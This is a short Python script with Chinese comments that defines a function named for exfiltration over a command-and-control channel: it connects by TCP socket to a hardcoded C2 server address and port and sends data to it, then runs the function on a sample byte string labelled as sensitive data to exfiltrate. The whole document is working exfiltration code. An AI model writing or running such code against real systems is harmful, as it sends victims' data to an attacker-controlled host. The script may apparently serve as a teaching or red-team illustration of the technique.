import socket

def exfiltration_over_c2(data):
    c2_ip = "192.168.1.100"
    c2_port = 1234

    # 連接到 C2 伺服器
    c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2_socket.connect((c2_ip, c2_port))

    # 將資料透過 C2 通道傳送
    c2_socket.sendall(data)

    # 關閉連接
    c2_socket.close()

# 測試範例
data = b"Sensitive data to exfiltrate"
exfiltration_over_c2(data)